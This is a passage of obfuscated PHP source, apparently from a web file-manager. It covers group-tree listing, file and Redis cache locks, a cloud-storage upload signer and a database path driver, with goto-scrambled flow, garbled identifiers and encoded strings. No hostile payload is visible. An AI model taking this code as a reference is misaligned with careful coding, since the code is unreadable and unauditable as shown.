b×…ŒÉ¹œ¹; b×…ŒÉ¹œ¹: } private function _listAppendChildren(&$cì‰·æ¸·°) { goto DéÊî„ƒ¬; BÒÆíÆ¿³: $fº†ç”‘¡³ = array_to_keyvalue($fº†ç”‘¡³, $CÉ›Øè—’[450]); foreach ($cì‰·æ¸·° as &$c•ÁëÖ§çƒ) { $c•ÁëÖ§çƒ[$CÉ›Øè—’[2196]] = isset($fº†ç”‘¡³[$c•ÁëÖ§çƒ[$CÉ›Øè—’[2114]] . $CÉ›Øè—’[2197]]); } goto bÀÖ™—ñÂ; DéÊî„ƒ¬: $CÉ›Øè—’ =& $_SERVER[¯Ò¬Èè]; $f´å¨æ…Ğ© = $CÉ›Øè—’[361]; $fº†ç”‘¡³ = array(); goto FÇõõ¢ïçÙ; FÇõõ¢ïçÙ: $fÊØÛ©Îã = count($cì‰·æ¸·°); $d¹ªÃ¹ù¦½ = $this->tablePrefix . $this->tableName; for ($aŒÍÂÏã = 0, $Dì¨Ã§İœ = 0; $aŒÍÂÏã < $fÊØÛ©Îã; $aŒÍÂÏã++) { $Dì¨Ã§İœ++; $bÔñ¬è·õ = $cì‰·æ¸·°[$aŒÍÂÏã][$CÉ›Øè—’[2114]]; $f´å¨æ…Ğ© .= "\123\105\114\105\103\124\x20\x2a\x20\106\x52\117\115\40\50\x53\x45\x4c\105\103\124\40\47{$bÔñ¬è·õ}\137\143\150\x69\154\x64\47\x20\141\163\x20\x68\141\163\40\106\122\x4f\115\40\x60{$d¹ªÃ¹ù¦½}\140\x20\x77\150\145\x72\145\40\160\141\x72\145\x6e\x74\x49\x44\x3d{$bÔñ¬è·õ}\x20\154\x69\x6d\x69\x74\x20\x31\51\40\141\163\40\164\142\x5f{$bÔñ¬è·õ}\x20\165\156\151\x6f\x6e\40\x61\x6c\154\40"; if (($Dì¨Ã§İœ >= 20 || $aŒÍÂÏã == $fÊØÛ©Îã - 1) && $f´å¨æ…Ğ©) { $f´å¨æ…Ğ© = substr($f´å¨æ…Ğ©, 0, -strlen($CÉ›Øè—’[449])); $c¥éÒ™«¯× = $this->query($f´å¨æ…Ğ©); $fº†ç”‘¡³ = array_merge($fº†ç”‘¡³, $c¥éÒ™«¯×); $Dì¨Ã§İœ = 0; $f´å¨æ…Ğ© = $CÉ›Øè—’[33]; } } goto BÒÆíÆ¿³; bÀÖ™—ñÂ: } private function _listAppendChildrenMember(&$fî–ŒÅßÎ§) { goto aÆ°ÇÂ‚Æ; aÆ°ÇÂ‚Æ: $aŠÛ„¯®×è =& $_SERVER[¯Ò¬Èè]; $BŠğÌ¶´ˆ = $aŠÛ„¯®×è[361]; $C™õ…´”¬ê = array(); goto A¹²Ï§œÅ÷; A¹²Ï§œÅ÷: $eÕ§õÊ½ƒ = count($fî–ŒÅßÎ§); $b»°ãÀÊæÕ = $this->tablePrefix . $aŠÛ„¯®×è[2188]; for ($EÖÍ‰Ø…‹ = 0, $e’éåŒ¯õ– = 0; $EÖÍ‰Ø…‹ < $eÕ§õÊ½ƒ; $EÖÍ‰Ø…‹++) { $e’éåŒ¯õ–++; $C¶¬”Î²†Ï = $fî–ŒÅßÎ§[$EÖÍ‰Ø…‹][$aŠÛ„¯®×è[2114]]; $BŠğÌ¶´ˆ .= "\x53\x45\x4c\105\x43\124\x20\52\40\106\x52\x4f\x4d\x20\x28\123\x45\x4c\x45\103\124\x20\47{$C¶¬”Î²†Ï}\137\x63\x68\151\x6c\x64\47\x20\x61\163\40\150\141\163\x20\x46\122\117\x4d\x20\140{$b»°ãÀÊæÕ}\140\40\x77\150\x65\162\145\40\x67\x72\x6f\x75\160\x49\x44\75{$C¶¬”Î²†Ï}\x20\x6c\x69\155\x69\164\40\x31\x29\40\141\x73\40\x74\x62\x5f{$C¶¬”Î²†Ï}\40\165\156\x69\x6f\156\x20\141\154\154\40"; if (($e’éåŒ¯õ– >= 20 || $EÖÍ‰Ø…‹ == $eÕ§õÊ½ƒ - 1) && $BŠğÌ¶´ˆ) { $BŠğÌ¶´ˆ = substr($BŠğÌ¶´ˆ, 0, -strlen($aŠÛ„¯®×è[449])); $Fğ°¥ñ»óÔ = $this->query($BŠğÌ¶´ˆ); $C™õ…´”¬ê = array_merge($C™õ…´”¬ê, $Fğ°¥ñ»óÔ); $e’éåŒ¯õ– = 0; $BŠğÌ¶´ˆ = $aŠÛ„¯®×è[33]; } } goto aÒÆ¨øŠìÖ; aÒÆ¨øŠìÖ: $C™õ…´”¬ê = array_to_keyvalue($C™õ…´”¬ê, $aŠÛ„¯®×è[450]); foreach ($fî–ŒÅßÎ§ as &$Cµ©âµ™Î„) { $Cµ©âµ™Î„[$aŠÛ„¯®×è[2198]] = isset($C™õ…´”¬ê[$Cµ©âµ™Î„[$aŠÛ„¯®×è[2114]] . $aŠÛ„¯®×è[2197]]); } goto câ™÷ÄÅ­Ò; câ™÷ÄÅ­Ò: } private function _listAppendMeta(&$BŒõ°äè‰ñ, $eÚ ÂÑŞÆ¯) { $bØ”Û“É”Ş =& $_SERVER[¯Ò¬Èè]; $cí—˜Ëãäƒ = array($bØ”Û“É”Ş[2114] => array($bØ”Û“É”Ş[7], $eÚ ÂÑŞÆ¯)); $Béœ†í…÷æ = Model($bØ”Û“É”Ş[2187])->where($cí—˜Ëãäƒ)->select(); $Béœ†í…÷æ = array_to_keyvalue_group($Béœ†í…÷æ, $bØ”Û“É”Ş[2114]); foreach ($Béœ†í…÷æ as &$A‘ùÕ±Œ§š) { $A‘ùÕ±Œ§š = array_to_keyvalue($A‘ùÕ±Œ§š, $bØ”Û“É”Ş[89], $bØ”Û“É”Ş[359]); } foreach ($BŒõ°äè‰ñ as &$D÷±›¡š±Æ) { $D÷±›¡š±Æ[$bØ”Û“É”Ş[417]] = array(); if (isset($Béœ†í…÷æ[$D÷±›¡š±Æ[$bØ”Û“É”Ş[2114]]])) { $D÷±›¡š±Æ[$bØ”Û“É”Ş[417]] = $Béœ†í…÷æ[$D÷±›¡š±Æ[$bØ”Û“É”Ş[2114]]]; } } } protected function parentLevelArray($eœÎ‡„¬Ä¬) { $aŒ‹¿´”ö =& $_SERVER[¯Ò¬Èè]; $eœÎ‡„¬Ä¬ = explode($aŒ‹¿´”ö[47], trim($eœÎ‡„¬Ä¬, $aŒ‹¿´”ö[47])); $eœÎ‡„¬Ä¬ = array_remove_value($eœÎ‡„¬Ä¬, $aŒ‹¿´”ö[468]); return $eœÎ‡„¬Ä¬; } private function _listAppendParent(&$C×½ÅÌÇ¶) { goto d¾¼êÌé; A±…¦‰¸‹: foreach ($C×½ÅÌÇ¶ as &$DÓÄ¸¥õÃÆ) { $AÕ„ƒÛ˜†¯ = $this->parentLevelArray($DÓÄ¸¥õÃÆ[$EÌœ¸äâô[459]]); $aİ¼ù×»  = $EÌœ¸äâô[33]; foreach ($AÕ„ƒÛ˜†¯ as $B¼¨’©ë”) { $aİ¼ù×»  .= $fÓÎÍ‡íâ›[$B¼¨’©ë”] . $EÌœ¸äâô[8]; } if ($AÕ„ƒÛ˜†¯) { $aİ¼ù×»  .= $DÓÄ¸¥õÃÆ[$EÌœ¸äâô[28]]; } $DÓÄ¸¥õÃÆ[$EÌœ¸äâô[463]] = str_replace($EÌœ¸äâô[467], $EÌœ¸äâô[8], $aİ¼ù×» ); } goto Aİ¨›»‡¼; d¾¼êÌé: $EÌœ¸äâô =& $_SERVER[¯Ò¬Èè]; $fÓÎÍ‡íâ› = array(); foreach ($C×½ÅÌÇ¶ as &$DÓÄ¸¥õÃÆ) { $fÓÎÍ‡íâ›[$DÓÄ¸¥õÃÆ[$EÌœ¸äâô[2114]]] = $DÓÄ¸¥õÃÆ[$EÌœ¸äâô[28]]; $AÕ„ƒÛ˜†¯ = $this->parentLevelArray($DÓÄ¸¥õÃÆ[$EÌœ¸äâô[459]]); foreach ($AÕ„ƒÛ˜†¯ as $B¼¨’©ë”) { if (!isset($fÓÎÍ‡íâ›[$B¼¨’©ë”])) { $fÓÎÍ‡íâ›[$B¼¨’©ë”] = 0; } } } goto E”ÆŸ‘‚ß; E”ÆŸ‘‚ß: $DÁò††·æ¬ = array(); foreach ($fÓÎÍ‡íâ› as $câØèÍ¨®¬ => $eƒ†˜ê ’î) { if (!$eƒ†˜ê ’î) { $DÁò††·æ¬[] = $câØèÍ¨®¬; } } if ($DÁò††·æ¬) { $d‚•ŸÌ°Õ¡ = array($EÌœ¸äâô[2186] => array($EÌœ¸äâô[384], $DÁò††·æ¬)); $e¯™×À›×¬ = $this->field($EÌœ¸äâô[2199])->where($d‚•ŸÌ°Õ¡)->select(); $CŸÚŸêèìÙ = array_to_keyvalue($e¯™×À›×¬, $EÌœ¸äâô[2114], $EÌœ¸äâô[28]); $fÓÎÍ‡íâ› = array_merge_index($fÓÎÍ‡íâ›, $CŸÚŸêèìÙ); } goto A±…¦‰¸‹; Aİ¨›»‡¼: } private function _listAppendSourceRoot(&$E¾µÎÚ„éà, $eº‹µ²É’ª) { goto FÌ·¢•ìÖ¾; FÌ·¢•ìÖ¾: $B«¢„Ø‰¢± =& $_SERVER[¯Ò¬Èè]; $eé¤İÒ°¼ = array($B«¢„Ø‰¢±[371] => SourceModel::TYPE_GROUP, $B«¢„Ø‰¢±[461] => 0, $B«¢„Ø‰¢±[456] => array($B«¢„Ø‰¢±[7], $eº‹µ²É’ª)); $e¥ßÄĞ¸ĞŞ = $B«¢„Ø‰¢±[2200]; goto aÎÂøÜ ; aÎÂøÜ : $c»é‡­Ç„ = Model($B«¢„Ø‰¢±[767])->order($B«¢„Ø‰¢±[2201])->field($e¥ßÄĞ¸ĞŞ)->where($eé¤İÒ°¼)->select(); $c»é‡­Ç„ = array_to_keyvalue($c»é‡­Ç„, $B«¢„Ø‰¢±[456]); $c»é‡­Ç„ = array_remove_key($c»é‡­Ç„, $B«¢„Ø‰¢±[456]); goto D¤ä¾ëˆÖ; D¤ä¾ëˆÖ: foreach ($E¾µÎÚ„éà as &$BµÆÎÓÏ¿Ô) { $BµÆÎÓÏ¿Ô[$B«¢„Ø‰¢±[391]] = $c»é‡­Ç„[$BµÆÎÓÏ¿Ô[$B«¢„Ø‰¢±[2114]]] ? $c»é‡­Ç„[$BµÆÎÓÏ¿Ô[$B«¢„Ø‰¢±[2114]]] : array(); } goto c“¾ƒí¶Ñ; c“¾ƒí¶Ñ: } protected function resetParentLevel() { $AœŸâòÅ´î =& $_SERVER[¯Ò¬Èè]; $bó‚Ğ•§Ù© = $AœŸâòÅ´î[2114]; $bŞµ¤ƒ¶ÍŸ = $this->select(); $bŞµ¤ƒ¶ÍŸ = array_to_keyvalue($bŞµ¤ƒ¶ÍŸ, $bó‚Ğ•§Ù©); foreach ($bŞµ¤ƒ¶ÍŸ as $b¶¼­ÙÉì) { goto D°‹…Ø¯—”; D°‹…Ø¯—”: $eé©‡½Â›‡ = $b¶¼­ÙÉì; $fª§ìÌÓ¤ = array(); while ($eé©‡½Â›‡[$AœŸâòÅ´î[461]] != 0) { $fª§ìÌÓ¤[] = $eé©‡½Â›‡[$AœŸâòÅ´î[461]]; $eé©‡½Â›‡ = $bŞµ¤ƒ¶ÍŸ[$eé©‡½Â›‡[$AœŸâòÅ´î[461]]]; } goto d’»¯¹ªâ; d’»¯¹ªâ: $fª§ìÌÓ¤[] = 0; $fª§ìÌÓ¤ = $AœŸâòÅ´î[47] . implode($AœŸâòÅ´î[47], array_reverse($fª§ìÌÓ¤)) . $AœŸâòÅ´î[47]; $this->setNamePinyin($b¶¼­ÙÉì[$bó‚Ğ•§Ù©], $b¶¼­ÙÉì[$AœŸâòÅ´î[28]]); goto fì­¥ù·İì; fì­¥ù·İì: $this->where(array($bó‚Ğ•§Ù© => $b¶¼­ÙÉì[$bó‚Ğ•§Ù©]))->save(array($AœŸâòÅ´î[534] => $fª§ìÌÓ¤)); goto aÒÒÄÓÒôÉ; aÒÒÄÓÒôÉ: } return $bŞµ¤ƒ¶ÍŸ; } public function groupNameAuto($b‡Éƒù•Ş, $EâŞ…²µœ‘) { $b±«¨‡Ø‡Õ =& $_SERVER[¯Ò¬Èè]; $e­è¢ÄÇ‰Ú = $this->where(array($b±«¨‡Ø‡Õ[368] => $b‡Éƒù•Ş))->getField($b±«¨‡Ø‡Õ[28], !0); if (!$e­è¢ÄÇ‰Ú || !in_array($EâŞ…²µœ‘, $e­è¢ÄÇ‰Ú)) { return $EâŞ…²µœ‘; } for ($A˜É‹¸ËÆÍ = 1; $A˜É‹¸ËÆÍ <= count($e­è¢ÄÇ‰Ú) + 1; $A˜É‹¸ËÆÍ++) { $dÕóã“¢–è = $EâŞ…²µœ‘ . "\50{$A˜É‹¸ËÆÍ}\x29"; if (!in_array($dÕóã“¢–è, $e­è¢ÄÇ‰Ú)) { return $dÕóã“¢–è; } } } } goto a³§¸êÉ’; B¥Œ“ÑÃñ‹: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $F…¤Æš‚ =& $_SERVER[¯Ò¬Èè]; $FçÀ²ø = $GLOBALS[$F…¤Æš‚[6]][$F…¤Æš‚[337]]; self::$cachePath = $FçÀ²ø[$F…¤Æš‚[167]][$F…¤Æš‚[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($fàĞÜÙªí, $B“å…ÁŸ´‘ = 0) { goto C‘±ÕÈƒŒ¿; B¤æÄµŒË­: $Bè±©íˆƒƒ = rtrim(self::$cachePath, $c‘¡›õ³£›[8]) . $c‘¡›õ³£›[788] . md5($fàĞÜÙªí) . $c‘¡›õ³£›[789]; if (file_exists($Bè±©íˆƒƒ) && filemtime($Bè±©íˆƒƒ) && filemtime($Bè±©íˆƒƒ) < time() - 10) { @unlink($Bè±©íˆƒƒ); } do { if (file_exists($Bè±©íˆƒƒ)) { cacheLockWait(); continue; } $A»ö°”ø‰è = fopen($Bè±©íˆƒƒ, $c‘¡›õ³£›[790]); if (!$A»ö°”ø‰è) { return !1; } $aÏĞ¨î«»£ = flock($A»ö°”ø‰è, LOCK_EX | LOCK_NB); self::$caches[$fàĞÜÙªí] = array($c‘¡›õ³£›[791] => $A»ö°”ø‰è, $c‘¡›õ³£›[167] => $Bè±©íˆƒƒ); fwrite($A»ö°”ø‰è, $a¬àÂºÁ˜); clearstatcache(); if ($A»ö°”ø‰è && $aÏĞ¨î«»£) { return !0; } cacheLockWait(); } while (microtime(!0) < $a¬àÂºÁ˜); goto E¬ÇíÁó·; C‘±ÕÈƒŒ¿: $c‘¡›õ³£› =& $_SERVER[¯Ò¬Èè]; $E‡‚¸¢øËó = microtime(!0); $a¬àÂºÁ˜ = $E‡‚¸¢øËó + $B“å…ÁŸ´‘ + 0.0001; goto B¤æÄµŒË­; E¬ÇíÁó·: $this->unlock($fàĞÜÙªí); return !1; goto Cß–‘çÈÜ; Cß–‘çÈÜ: } public function lockGet($Aù¼²¤¾™) { $c—ÈŒœ‹Ù =& $_SERVER[¯Ò¬Èè]; $aÅ“äˆÓÅø = rtrim(self::$cachePath, $c—ÈŒœ‹Ù[8]) . $c—ÈŒœ‹Ù[788] . md5($Aù¼²¤¾™) . $c—ÈŒœ‹Ù[789]; return file_exists($aÅ“äˆÓÅø); } public function unlock($fáÅéĞÉª–) { goto F×Ö‡Ü­ÄÔ; d‘†¡ì±¢ï: @flock($f¨¼âÄÊŸí[$DåÂ§ñŒÔÀ[791]], LOCK_UN); @fclose($f¨¼âÄÊŸí[$DåÂ§ñŒÔÀ[791]]); @unlink($f¨¼âÄÊŸí[$DåÂ§ñŒÔÀ[167]]); goto DÌğ¼ÃºÄ‘; F×Ö‡Ü­ÄÔ: $DåÂ§ñŒÔÀ =& $_SERVER[¯Ò¬Èè]; $f¨¼âÄÊŸí = self::$caches[$fáÅéĞÉª–]; if (!$f¨¼âÄÊŸí) { return; } goto d‘†¡ì±¢ï; DÌğ¼ÃºÄ‘: unset(self::$caches[$fáÅéĞÉª–]); goto F‚¿¹šƒ˜µ; F‚¿¹šƒ˜µ: } } class CacheLockRedis { public function lock($c­ã—Ä–, $a´¦å‰ƒ–í = 10) { $eÕ”÷Š¾ñ› = Cache::init(); $AÛÃƒ¥¡ç = microtime(!0) + $a´¦å‰ƒ–í; while (microtime(!0) < $AÛÃƒ¥¡ç) { $EÊ¥©İà¶ = $eÕ”÷Š¾ñ›->get($c­ã—Ä–); if (!$EÊ¥©İà¶) { $CÒäÒ°Éç± = $eÕ”÷Š¾ñ›->setLock($c­ã—Ä–, $AÛÃƒ¥¡ç, $a´¦å‰ƒ–í); if ($CÒäÒ°Éç±) { return !0; } } else { if ($EÊ¥©İà¶ < microtime(!0)) { $eÕ”÷Š¾ñ›->set($c­ã—Ä–, $AÛÃƒ¥¡ç, $AÛÃƒ¥¡ç); if ($eÕ”÷Š¾ñ›->get($c­ã—Ä–) === $EÊ¥©İà¶) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($FÊÄ§Š‰Â) { return Cache::init()->get($FÊÄ§Š‰Â); } public function unlock($d¹ÓÍÉ¨ÛÁ) { return Cache::init()->remove($d¹ÓÍÉ¨ÛÁ); } } goto c‡“•²›µ±; A ‹®Äí’: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($aÎôÆÍ£Âò) { parent::__construct($aÎôÆÍ£Âò); $this->signatureVersion($_SERVER[¯Ò¬Èè][200]); } public function uploadFormData($c„ØˆÀ©¡¶, $F–ŞÅÆ¸­ = 3600) { goto CÎ«Ñ°¹„; c‚İ‚ëŸëĞ: $A±£–ŠŸ  = sha1($bïâÜ¾¢); $féÆè½ˆ¥œ = hash_hmac($b¬¬´²ŠÜ´[218], $A±£–ŠŸ , $CÎ‘ãÆ‚ÇÙ); $eºŠ‘Ü¤À÷ = array($b¬¬´²ŠÜ´[1113] => $E ğçÀ±‹Ì, $b¬¬´²ŠÜ´[1117] => $f–ìŒÎá–, $b¬¬´²ŠÜ´[1121] => base64_encode($bïâÜ¾¢), $b¬¬´²ŠÜ´[1118] => $DÚ£ò»‡ØÌ, $b¬¬´²ŠÜ´[1119] => $this->accessKey, $b¬¬´²ŠÜ´[1122] => $D¡—øšåäÎ, $b¬¬´²ŠÜ´[1123] => $féÆè½ˆ¥œ, $b¬¬´²ŠÜ´[169] => $this->getHost()); goto a§‹Ğ…©‡; a§‹Ğ…©‡: return $eºŠ‘Ü¤À÷; goto eÃ¬»¡µÊ; C¦Óºåç‡¦: $bïâÜ¾¢ = array($b¬¬´²ŠÜ´[1111] => $bµ¢ñÂóë, $b¬¬´²ŠÜ´[1112] => array(array($b¬¬´²ŠÜ´[1113] => $E ğçÀ±‹Ì), array($b¬¬´²ŠÜ´[1114] => $this->bucket), array($b¬¬´²ŠÜ´[1115], $b¬¬´²ŠÜ´[1116], $b¬¬´²ŠÜ´[33]), array($b¬¬´²ŠÜ´[1117] => $f–ìŒÎá–), array($b¬¬´²ŠÜ´[1118] => $DÚ£ò»‡ØÌ), array($b¬¬´²ŠÜ´[1119] => $this->accessKey), array($b¬¬´²ŠÜ´[1120] => $D¡—øšåäÎ))); $bïâÜ¾¢ = json_encode($bïâÜ¾¢); $CÎ‘ãÆ‚ÇÙ = hash_hmac($b¬¬´²ŠÜ´[218], $D¡—øšåäÎ, $this->secret); goto c‚İ‚ëŸëĞ; B™áóçÓ: $f–ìŒÎá– = $b¬¬´²ŠÜ´[1109]; $bµ¢ñÂóë = gmdate($b¬¬´²ŠÜ´[1110], time() + $F–ŞÅÆ¸­); $D¡—øšåäÎ = (string) time() . $b¬¬´²ŠÜ´[67] . (string) (time() + $F–ŞÅÆ¸­); goto C¦Óºåç‡¦; CÎ«Ñ°¹„: $b¬¬´²ŠÜ´ =& $_SERVER[¯Ò¬Èè]; $E ğçÀ±‹Ì = $b¬¬´²ŠÜ´[185]; $DÚ£ò»‡ØÌ = $b¬¬´²ŠÜ´[218]; goto B™áóçÓ; eÃ¬»¡µÊ: } public function fileOutLink($fŠÊ³ç£â) { $CÛ©ôòÚÁ¿ =& $_SERVER[¯Ò¬Èè]; if (substr($fŠÊ³ç£â, 0, 7) == $CÛ©ôòÚÁ¿[1124]) { $fŠÊ³ç£â = $CÛ©ôòÚÁ¿[1125] . substr($fŠÊ³ç£â, 7); } header($CÛ©ôòÚÁ¿[156] . $fŠÊ³ç£â); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($e¥ŒšĞ‹ˆ¬) { $this->pathParse = $e¥ŒšĞ‹ˆ¬; $this->model = Model($_SERVER[¯Ò¬Èè][1126]); } public function getPath($d¯¢ÇÚ) { return trim($d¯¢ÇÚ, $_SERVER[¯Ò¬Èè][8]); } public function pathFather($bÅË¸›¥ì°) { $FÛ±¶´ì“ = $this->parse($bÅË¸›¥ì°); $FÛ±¶´ì“ = $this->infoSimple($bÅË¸›¥ì°); return $FÛ±¶´ì“ ? $FÛ±¶´ì“[$_SERVER[¯Ò¬Èè][461]] : !1; } public function getPathName($AˆªÃ½ƒõ) { $bßŸ‰¾İÄ» = $this->infoSimple($AˆªÃ½ƒõ); return $bßŸ‰¾İÄ» ? $bßŸ‰¾İÄ»[$_SERVER[¯Ò¬Èè][28]] : !1; } public function getPathOuter($CŞ»¡‘¾ã¥) { if (!$CŞ»¡‘¾ã¥) { return $CŞ»¡‘¾ã¥; } $dŸ­ÉØ•ï = $this->parse($CŞ»¡‘¾ã¥); return KodIO::make($dŸ­ÉØ•ï[$_SERVER[¯Ò¬Èè][367]]); } public function copyFolderFromIO($E‰õÈÆÈë, $f›õË…, $D‰¦È˜ÙÓÍ, $A¾Ğãè£Ù¾, $d¦¶Êù¦ëÖ) { $f”œóøæ«ö = $this->model->copyFolderFromIO($E‰õÈÆÈë, $f›õË…, $D‰¦È˜ÙÓÍ, $A¾Ğãè£Ù¾, $d¦¶Êù¦ëÖ); return KodIO::make($f”œóøæ«ö); } public function isParentOf($aÌ‹ÜôÛ, $c³äÒ¬ÃÆÜ) { return $this->model->isParentOf($aÌ‹ÜôÛ, $c³äÒ¬ÃÆÜ); } public function mkfile($EŒ™ŞÓÓ¯±, $bğâƒÌÃ¡ã = '', $fà‹¸²ô¬‡ = REPEAT_RENAME) { $eÕÊ×½½’à =& $_SERVER[¯Ò¬Èè]; $c×±˜ÉÕİô = $this->parse($EŒ™ŞÓÓ¯±); $EŒ™ŞÓÓ¯± = $c×±˜ÉÕİô[$eÕÊ×½½’à[367]]; for ($Dãö‚ ÔŸÔ = 0; $Dãö‚ ÔŸÔ < count($c×±˜ÉÕİô[$eÕÊ×½½’à[1127]]); $Dãö‚ ÔŸÔ++) { $FÕ¦Öºâá = $c×±˜ÉÕİô[$eÕÊ×½½’à[1127]][$Dãö‚ ÔŸÔ]; if ($Dãö‚ ÔŸÔ == count($c×±˜ÉÕİô[$eÕÊ×½½’à[1127]]) - 1) { $EŒ™ŞÓÓ¯± = $this->model->mkfile($EŒ™ŞÓÓ¯±, $FÕ¦Öºâá, $bğâƒÌÃ¡ã, $fà‹¸²ô¬‡); break; } $EŒ™ŞÓÓ¯± = $this->model->mkdir($EŒ™ŞÓÓ¯±, $FÕ¦Öºâá, REPEAT_SKIP); } return $this->getPathOuter($EŒ™ŞÓÓ¯±); } public function mkdir($fÚÓ¹ªğ£, $Cõˆ¤¡ğ‹ = REPEAT_SKIP) { $e»êõƒ„äí =& $_SERVER[¯Ò¬Èè]; $E¨Â‚ŒÔª• = $this->parse($fÚÓ¹ªğ£); $fÚÓ¹ªğ£ = $E¨Â‚ŒÔª•[$e»êõƒ„äí[367]]; for ($CÎã£¤¬¡µ = 0; $CÎã£¤¬¡µ < count($E¨Â‚ŒÔª•[$e»êõƒ„äí[1127]]); $CÎã£¤¬¡µ++) { $C„„Ó›Èø = $E¨Â‚ŒÔª•[$e»êõƒ„äí[1127]][$CÎã£¤¬¡µ]; $fÚÓ¹ªğ£ = $this->model->mkdir($fÚÓ¹ªğ£, $C„„Ó›Èø, $Cõˆ¤¡ğ‹); } return $this->getPathOuter($fÚÓ¹ªğ£); } public function copyFile($fàÉª—àğÇ, $f”îÛÚß¶©, $fâÊÜÒÊ‰Ê = REPEAT_REPLACE) { $fÃì İ¡Ÿª =& $_SERVER[¯Ò¬Èè]; $fŸÚó±ñ˜ = $this->parse($f”îÛÚß¶©); $dó£Î¤ƒö• = $this->model->copy($fàÉª—àğÇ, $fŸÚó±ñ˜[$fÃì İ¡Ÿª[367]], $fâÊÜÒÊ‰Ê, $fŸÚó±ñ˜[$fÃì İ¡Ÿª[75]]); return $dó£Î¤ƒö• ? $this->getPathOuter($dó£Î¤ƒö•) : !1; } public function moveFile($d°ÛÂ±’®, $còâİ‚Úå’, $e¸É±å¼‹’ = REPEAT_REPLACE) { $b´±¤…ÖÊ‰ =& $_SERVER[¯Ò¬Èè]; $b±ÜÛö¥íÕ = $this->parse($còâİ‚Úå’); $BîõùÄ¾‘ = $this->model->move($d°ÛÂ±’®, $b±ÜÛö¥íÕ[$b´±¤…ÖÊ‰[367]], $e¸É±å¼‹’, $b±ÜÛö¥íÕ[$b´±¤…ÖÊ‰[75]]); return $BîõùÄ¾‘ ? $this->getPathOuter($BîõùÄ¾‘) : !1; } public function copy($Bš®±Œœõ©, $D¯Öˆâ‘Ë˜, $F²­”î‹ = REPEAT_REPLACE) { $d‘…®ğëŒÛ = $this->parse($D¯Öˆâ‘Ë˜); $cùù’ô¶–º = $this->model->copy($Bš®±Œœõ©, $d‘…®ğëŒÛ[$_SERVER[¯Ò¬Èè][367]], $F²­”î‹); return $cùù’ô¶–º ? $this->getPathOuter($cùù’ô¶–º) : !1; } public function moveSameAllow() { } public function move($C´È”«ä‚’, $A……ä¿ ˆ, $d èò•…ƒá = REPEAT_REPLACE) { $Cã±ÔŒßãÏ = $this->parse($A……ä¿ ˆ); $b‘¯˜£·¸¾ = $this->model->move($C´È”«ä‚’, $Cã±ÔŒßãÏ[$_SERVER[¯Ò¬Èè][367]], $d èò•…ƒá); return $b‘¯˜£·¸¾ ? $this->getPathOuter($b‘¯˜£·¸¾) : !1; } public function remove($C‰´ØÉŸÆ, $CÊÖĞçÑ = true) { return $this->model->remove($C‰´ØÉŸÆ, $CÊÖĞçÑ); } public function rename($d’³æ†ô‡§, $D‚Ç‘ø˜Ş) { $e‘Œ¯ß‡Û = $this->model->rename($d’³æ†ô‡§, $D‚Ç‘ø˜Ş); return $e‘Œ¯ß‡Û ? $this->getPathOuter($d’³æ†ô‡§) : $e‘Œ¯ß‡Û; } public function size($C²‹¾°ôØõ) { $bÉÚ†ÃÏ½´ = $this->infoSimple($C²‹¾°ôØõ); return $bÉÚ†ÃÏ½´ ? $bÉÚ†ÃÏ½´[$_SERVER[¯Ò¬Èè][77]] : 0; } public function infoSimple($D×Æ–¼ôÌ) { return $this->model->sourceInfo($D×Æ–¼ôÌ); } public function info($fßÛñìÅ¯·) { return $this->infoParse($fßÛñìÅ¯·); } public function infoAuth($Fñáæ‹ÉŞ) { return $this->infoParse($Fñáæ‹ÉŞ, !1, !0); } public function infoWithChildren($BöÉÆæ¢äº) { return $this->infoParse($BöÉÆæ¢äº, !0); } protected function infoParse($bÑ¢Õä­Õ, $aóÆí¬ÉÊš = false, $d£‚ó›œÎê = false) { if (!$aóÆí¬ÉÊš) { return $this->model->pathInfo($bÑ¢Õä­Õ, $d£‚ó›œÎê); } return $this->model->pathInfoMore($bÑ¢Õä­Õ); } public function infoFull($e«›Îº®ƒ) { $aá¢”äù‘Ñ =& $_SERVER[¯Ò¬Èè]; $A¯ã¼Ä  = explode($aá¢”äù‘Ñ[8], $e«›Îº®ƒ); $ašŸ«“§· = implode($aá¢”äù‘Ñ[8], array_splice($A¯ã¼Ä , 1)); return $this->model->pathInfoByPath($A¯ã¼Ä [0], $ašŸ«“§·); } public function hashSimple($Cõ»ÜøÜÏİ) { $f£Ûˆ£×°« =& $_SERVER[¯Ò¬Èè]; $aÂæÆŞ‹®› = $this->infoWithChildren($Cõ»ÜøÜÏİ); return $aÂæÆŞ‹®›[$f£Ûˆ£×°«[162]][$f£Ûˆ£×°«[164]]; } public function hashMd5($cæ‚ã»Û›…) { $e¯´×’¬» =& $_SERVER[¯Ò¬Èè]; $AˆÕ„¸š…Ÿ = $this->infoWithChildren($cæ‚ã»Û›…); return $AˆÕ„¸š…Ÿ[$e¯´×’¬»[162]][$e¯´×’¬»[163]]; } public function exist($dØ¯£®Í) { $AÓÏ·„÷©” =& $_SERVER[¯Ò¬Èè]; $bÃášğ³šÊ = $this->parse($dØ¯£®Í); if (!$bÃášğ³šÊ[$AÓÏ·„÷©”[75]]) { return $this->isFile($dØ¯£®Í) || $this->isFolder($dØ¯£®Í); } $c‚ŠŞËÂ°Æ = array($AÓÏ·„÷©”[368] => $bÃášğ³šÊ[$AÓÏ·„÷©”[367]], $AÓÏ·„÷©”[28] => $bÃášğ³šÊ[$AÓÏ·„÷©”[75]]); $CàÎœ¨¡ï¼ = $this->model->where($c‚ŠŞËÂ°Æ)->find(); return $CàÎœ¨¡ï¼ ? !0 : !1; } public function isFile($cÚæ•…ƒ) { $A’ÑÔæŸ³ =& $_SERVER[¯Ò¬Èè]; $d½§ÀèÑÔ = $this->infoSimple($cÚæ•…ƒ); return $d½§ÀèÑÔ && $d½§ÀèÑÔ[$A’ÑÔæŸ³[370]] == $A’ÑÔæŸ³[83] ? !1 : !0; } public function isFolder($déƒÁòéã) { $B»•ô’Œí =& $_SERVER[¯Ò¬Èè]; $fà¶ªÃë›„ = $this->infoSimple($déƒÁòéã); return $fà¶ªÃë›„ && $fà¶ªÃë›„[$B»•ô’Œí[370]] == $B»•ô’Œí[83] ? !0 : !1; } public function listPath($Fí¦•…Áö, $aï†Ò›¸¼ = false) { $D¿ÏÁõ‘™ =& $_SERVER[¯Ò¬Èè]; if ($Fí¦•…Áö == 